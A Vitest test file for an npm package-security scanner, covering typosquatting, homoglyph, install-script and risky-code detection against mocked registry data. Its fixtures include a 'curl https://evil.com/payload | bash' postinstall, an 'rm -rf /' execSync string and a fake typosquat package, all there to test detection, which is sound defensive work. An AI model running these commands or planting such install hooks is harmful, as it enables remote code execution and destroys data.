// ============================================================
// OpenClaw Deploy — Package Scanner Tests
// ============================================================

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import {
  checkTyposquatting,
  checkHomoglyphs,
  scanLifecycleScripts,
  scanCodePatterns,
  levenshteinDistance,
  checkNpmRegistry,
  checkGitHubRepo,
  scanPackage,
} from '../../../src/core/security/package-scanner.js';
import type { PackageScanReport } from '../../../src/core/security/package-scanner.js';

// --- Levenshtein distance ---

describe('levenshteinDistance', () => {
  it('returns 0 for identical strings', () => {
    expect(levenshteinDistance('lodash', 'lodash')).toBe(0);
  });

  it('returns correct distance for single character difference', () => {
    expect(levenshteinDistance('lodash', 'lodas')).toBe(1);
    expect(levenshteinDistance('lodash', 'lodashh')).toBe(1);
  });

  it('returns correct distance for two character difference', () => {
    expect(levenshteinDistance('lodash', 'loda')).toBe(2);
    expect(levenshteinDistance('express', 'xpress')).toBe(1);
  });

  it('handles empty strings', () => {
    expect(levenshteinDistance('', 'abc')).toBe(3);
    expect(levenshteinDistance('abc', '')).toBe(3);
    expect(levenshteinDistance('', '')).toBe(0);
  });
});

// --- Typosquatting ---

describe('checkTyposquatting', () => {
  it('flags "lodas" as similar to "lodash"', () => {
    const findings = checkTyposquatting('lodas');
    expect(findings.length).toBeGreaterThan(0);
    expect(findings[0].severity).toBe('critical');
    expect(findings[0].category).toBe('typosquatting');
    expect(findings[0].message).toContain('lodash');
  });

  it('flags "expresss" as similar to "express"', () => {
    const findings = checkTyposquatting('expresss');
    expect(findings.length).toBeGreaterThan(0);
    expect(findings.some(f => f.message.includes('express'))).toBe(true);
  });

  it('flags "recat" as similar to "react"', () => {
    const findings = checkTyposquatting('recat');
    expect(findings.length).toBeGreaterThan(0);
    expect(findings.some(f => f.message.includes('react'))).toBe(true);
  });

  it('does not flag exact match (the package itself)', () => {
    const findings = checkTyposquatting('lodash');
    expect(findings.length).toBe(0);
  });

  it('does not flag unrelated packages', () => {
    const findings = checkTyposquatting('my-unique-totally-different-package');
    expect(findings.length).toBe(0);
  });
});

// --- Homoglyphs ---

describe('checkHomoglyphs', () => {
  it('detects Cyrillic "a" (U+0430) masquerading as Latin "a"', () => {
    const findings = checkHomoglyphs('l\u043Edash'); // Cyrillic "о" instead of Latin "o"
    expect(findings.length).toBeGreaterThan(0);
    expect(findings[0].severity).toBe('critical');
    expect(findings[0].category).toBe('homoglyph');
    expect(findings[0].message).toContain('Cyrillic');
  });

  it('detects zero-width space', () => {
    const findings = checkHomoglyphs('lod\u200Bash');
    expect(findings.length).toBeGreaterThan(0);
    expect(findings.some(f => f.message.includes('Zero-width space'))).toBe(true);
  });

  it('detects RTL override character', () => {
    const findings = checkHomoglyphs('test\u202Ename');
    expect(findings.length).toBeGreaterThan(0);
    expect(findings.some(f => f.message.includes('Right-to-left override'))).toBe(true);
  });

  it('detects Greek lookalikes', () => {
    const findings = checkHomoglyphs('\u03B1bc'); // Greek alpha instead of Latin a
    expect(findings.length).toBeGreaterThan(0);
    expect(findings.some(f => f.message.includes('Greek'))).toBe(true);
  });

  it('returns empty for clean ASCII text', () => {
    const findings = checkHomoglyphs('lodash');
    expect(findings.length).toBe(0);
  });
});

// --- Lifecycle Scripts ---

describe('scanLifecycleScripts', () => {
  it('flags postinstall script', () => {
    const pkg = {
      scripts: {
        postinstall: 'node setup.js',
      },
    };
    const findings = scanLifecycleScripts(pkg);
    expect(findings.length).toBeGreaterThan(0);
    expect(findings[0].severity).toBe('critical');
    expect(findings[0].category).toBe('lifecycle-script');
    expect(findings[0].message).toContain('postinstall');
  });

  it('flags preinstall script', () => {
    const pkg = {
      scripts: {
        preinstall: 'echo hello',
      },
    };
    const findings = scanLifecycleScripts(pkg);
    expect(findings.length).toBeGreaterThan(0);
    expect(findings.some(f => f.message.includes('preinstall'))).toBe(true);
  });

  it('flags curl piped to bash in postinstall', () => {
    const pkg = {
      scripts: {
        postinstall: 'curl https://evil.com/payload | bash',
      },
    };
    const findings = scanLifecycleScripts(pkg);
    // Should have both the lifecycle script finding and the high-risk pattern
    expect(findings.length).toBeGreaterThanOrEqual(2);
    expect(findings.some(f => f.message.includes('High-risk pattern'))).toBe(true);
  });

  it('does not flag regular scripts like "build" or "test"', () => {
    const pkg = {
      scripts: {
        build: 'tsc',
        test: 'vitest',
        start: 'node dist/index.js',
      },
    };
    const findings = scanLifecycleScripts(pkg);
    expect(findings.length).toBe(0);
  });

  it('handles package.json with no scripts', () => {
    const pkg = { name: 'test-package' };
    const findings = scanLifecycleScripts(pkg);
    expect(findings.length).toBe(0);
  });
});

// --- Code Patterns ---

describe('scanCodePatterns', () => {
  it('detects eval()', () => {
    const findings = scanCodePatterns('const result = eval(userInput);');
    expect(findings.length).toBeGreaterThan(0);
    expect(findings.some(f => f.message.includes('eval()'))).toBe(true);
  });

  it('detects execSync()', () => {
    const findings = scanCodePatterns('execSync("rm -rf /")');
    expect(findings.length).toBeGreaterThan(0);
    expect(findings.some(f => f.message.includes('execSync()'))).toBe(true);
  });

  it('detects new Function()', () => {
    const findings = scanCodePatterns('const fn = new Function("return 42")');
    expect(findings.length).toBeGreaterThan(0);
    expect(findings.some(f => f.message.includes('new Function()'))).toBe(true);
  });

  it('detects spawn()', () => {
    const findings = scanCodePatterns('spawn("node", ["script.js"])');
    expect(findings.length).toBeGreaterThan(0);
    expect(findings.some(f => f.message.includes('spawn()'))).toBe(true);
  });

  it('detects require("child_process")', () => {
    const findings = scanCodePatterns("const cp = require('child_process');");
    expect(findings.length).toBeGreaterThan(0);
    expect(findings.some(f => f.message.includes("require('child_process')"))).toBe(true);
  });

  it('detects dynamic import("child_process")', () => {
    const findings = scanCodePatterns("const cp = await import('child_process');");
    expect(findings.length).toBeGreaterThan(0);
    expect(findings.some(f => f.message.includes("import('child_process')"))).toBe(true);
  });

  it('detects base64 obfuscation (long encoded string)', () => {
    const longBase64 = 'A'.repeat(120);
    const findings = scanCodePatterns(`const payload = "${longBase64}";`);
    expect(findings.length).toBeGreaterThan(0);
    expect(findings.some(f => f.message.includes('base64-like'))).toBe(true);
  });

  it('detects String.fromCharCode', () => {
    const findings = scanCodePatterns('String.fromCharCode(72, 101, 108, 108, 111)');
    expect(findings.length).toBeGreaterThan(0);
    expect(findings.some(f => f.message.includes('String.fromCharCode()'))).toBe(true);
  });

  it('detects obfuscated variable names', () => {
    const findings = scanCodePatterns('var _0xabc123 = "malicious";');
    expect(findings.length).toBeGreaterThan(0);
    expect(findings.some(f => f.message.includes('Obfuscated variable name'))).toBe(true);
  });

  it('returns empty for clean code', () => {
    const findings = scanCodePatterns('const x = 1 + 2;\nconsole.log(x);');
    expect(findings.length).toBe(0);
  });
});

// --- Scoring and Verdict ---

describe('scanPackage scoring and verdict', () => {
  let originalFetch: typeof globalThis.fetch;

  beforeEach(() => {
    originalFetch = globalThis.fetch;
  });

  afterEach(() => {
    globalThis.fetch = originalFetch;
    vi.restoreAllMocks();
  });

  it('returns SAFE verdict for a clean, popular package', async () => {
    // Mock npm registry returning a well-maintained package
    globalThis.fetch = vi.fn().mockImplementation((url: string) => {
      if (url.includes('registry.npmjs.org')) {
        return Promise.resolve({
          ok: true,
          json: () =>
            Promise.resolve({
              'name': 'lodash',
              'description': 'Lodash modular utilities.',
              'dist-tags': { latest: '4.17.21' },
              'time': {
                created: '2012-04-23T00:00:00.000Z',
                '4.17.21': '2021-02-20T00:00:00.000Z',
              },
              'maintainers': [
                { name: 'jdalton' },
                { name: 'mathias' },
              ],
              'versions': {
                '4.17.21': {
                  name: 'lodash',
                  scripts: { test: 'echo test' },
                },
              },
              'repository': {
                url: 'git+https://github.com/lodash/lodash.git',
              },
            }),
        });
      }

      if (url.includes('api.npmjs.org/downloads')) {
        return Promise.resolve({
          ok: true,
          json: () => Promise.resolve({ downloads: 50_000_000 }),
        });
      }

      // GitHub API
      if (url.includes('api.github.com/repos') && !url.includes('contributors')) {
        return Promise.resolve({
          ok: true,
          json: () =>
            Promise.resolve({
              stargazers_count: 55000,
              archived: false,
              pushed_at: new Date().toISOString(),
            }),
        });
      }

      if (url.includes('contributors')) {
        return Promise.resolve({
          ok: true,
          json: () => Promise.resolve([{}, {}, {}, {}, {}]),
        });
      }

      return Promise.resolve({ ok: false, status: 404 });
    }) as unknown as typeof globalThis.fetch;

    const report = await scanPackage('lodash');
    expect(report.packageName).toBe('lodash');
    expect(report.verdict).toBe('SAFE');
    expect(report.score).toBeLessThanOrEqual(2);
  });

  it('returns RISKY verdict for typosquatting + low downloads', async () => {
    // "lodas" is distance-1 from "lodash"
    globalThis.fetch = vi.fn().mockImplementation((url: string) => {
      if (url.includes('registry.npmjs.org')) {
        return Promise.resolve({
          ok: true,
          json: () =>
            Promise.resolve({
              'name': 'lodas',
              'description': 'Totally not suspicious',
              'dist-tags': { latest: '1.0.0' },
              'time': {
                created: new Date().toISOString(),
                '1.0.0': new Date().toISOString(),
              },
              'maintainers': [{ name: 'attacker' }],
              'versions': {
                '1.0.0': {
                  name: 'lodas',
                  scripts: { postinstall: 'node payload.js' },
                },
              },
            }),
        });
      }

      if (url.includes('api.npmjs.org/downloads')) {
        return Promise.resolve({
          ok: true,
          json: () => Promise.resolve({ downloads: 5 }),
        });
      }

      return Promise.resolve({ ok: false, status: 404 });
    }) as unknown as typeof globalThis.fetch;

    const report = await scanPackage('lodas');
    expect(report.packageName).toBe('lodas');
    expect(report.verdict).toBe('RISKY');
    expect(report.score).toBeGreaterThanOrEqual(6);
    expect(report.findings.some(f => f.category === 'typosquatting')).toBe(true);
  });

  it('calculates score: info=0, warning=1, critical=3, capped at 10', async () => {
    // A package with many critical findings should cap at 10
    globalThis.fetch = vi.fn().mockImplementation((url: string) => {
      if (url.includes('registry.npmjs.org')) {
        return Promise.resolve({
          ok: false,
          status: 404,
        });
      }
      return Promise.resolve({ ok: false, status: 404 });
    }) as unknown as typeof globalThis.fetch;

    // "expresss" is close to "express" — that alone is a critical finding (3 points)
    // plus 404 is another critical (3 points) = 6 => RISKY
    const report = await scanPackage('expresss');
    expect(report.score).toBeLessThanOrEqual(10);
    expect(report.score).toBeGreaterThanOrEqual(6);
    expect(report.verdict).toBe('RISKY');
  });
});

// --- Registry check (mocked) ---

describe('checkNpmRegistry', () => {
  let originalFetch: typeof globalThis.fetch;

  beforeEach(() => {
    originalFetch = globalThis.fetch;
  });

  afterEach(() => {
    globalThis.fetch = originalFetch;
    vi.restoreAllMocks();
  });

  it('flags package not found on registry', async () => {
    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: false,
      status: 404,
    }) as unknown as typeof globalThis.fetch;

    const { findings, metadata } = await checkNpmRegistry('nonexistent-pkg');
    expect(metadata).toBeNull();
    expect(findings.some(f => f.message.includes('not found'))).toBe(true);
  });

  it('flags deprecated package', async () => {
    globalThis.fetch = vi.fn().mockImplementation((url: string) => {
      if (url.includes('registry.npmjs.org')) {
        return Promise.resolve({
          ok: true,
          json: () =>
            Promise.resolve({
              'name': 'old-pkg',
              'dist-tags': { latest: '1.0.0' },
              'time': { '1.0.0': '2020-01-01T00:00:00.000Z' },
              'maintainers': [{ name: 'dev1' }, { name: 'dev2' }],
              'versions': {
                '1.0.0': {
                  deprecated: 'Use new-pkg instead',
                  scripts: {},
                },
              },
            }),
        });
      }
      if (url.includes('api.npmjs.org/downloads')) {
        return Promise.resolve({
          ok: true,
          json: () => Promise.resolve({ downloads: 50000 }),
        });
      }
      return Promise.resolve({ ok: false, status: 404 });
    }) as unknown as typeof globalThis.fetch;

    const { findings, metadata } = await checkNpmRegistry('old-pkg');
    expect(metadata).not.toBeNull();
    expect(metadata!.deprecated).toBe(true);
    expect(findings.some(f => f.message.includes('deprecated'))).toBe(true);
  });
});

// --- GitHub check (mocked) ---

describe('checkGitHubRepo', () => {
  let originalFetch: typeof globalThis.fetch;

  beforeEach(() => {
    originalFetch = globalThis.fetch;
  });

  afterEach(() => {
    globalThis.fetch = originalFetch;
    vi.restoreAllMocks();
  });

  it('flags low star count', async () => {
    globalThis.fetch = vi.fn().mockImplementation((url: string) => {
      if (url.includes('contributors')) {
        return Promise.resolve({
          ok: true,
          json: () => Promise.resolve([{}, {}, {}, {}, {}]),
        });
      }
      return Promise.resolve({
        ok: true,
        json: () =>
          Promise.resolve({
            stargazers_count: 10,
            archived: false,
            pushed_at: new Date().toISOString(),
          }),
      });
    }) as unknown as typeof globalThis.fetch;

    const findings = await checkGitHubRepo('https://github.com/test/repo');
    expect(findings.some(f => f.message.includes('Low star count'))).toBe(true);
  });

  it('flags archived repository', async () => {
    globalThis.fetch = vi.fn().mockImplementation((url: string) => {
      if (url.includes('contributors')) {
        return Promise.resolve({
          ok: true,
          json: () => Promise.resolve([{}, {}, {}, {}, {}]),
        });
      }
      return Promise.resolve({
        ok: true,
        json: () =>
          Promise.resolve({
            stargazers_count: 1000,
            archived: true,
            pushed_at: new Date().toISOString(),
          }),
      });
    }) as unknown as typeof globalThis.fetch;

    const findings = await checkGitHubRepo('https://github.com/test/repo');
    expect(findings.some(f => f.message.includes('archived'))).toBe(true);
  });

  it('returns info finding for unparseable URL', async () => {
    const findings = await checkGitHubRepo('https://gitlab.com/test/repo');
    expect(findings.some(f => f.category === 'github' && f.severity === 'info')).toBe(true);
  });
});
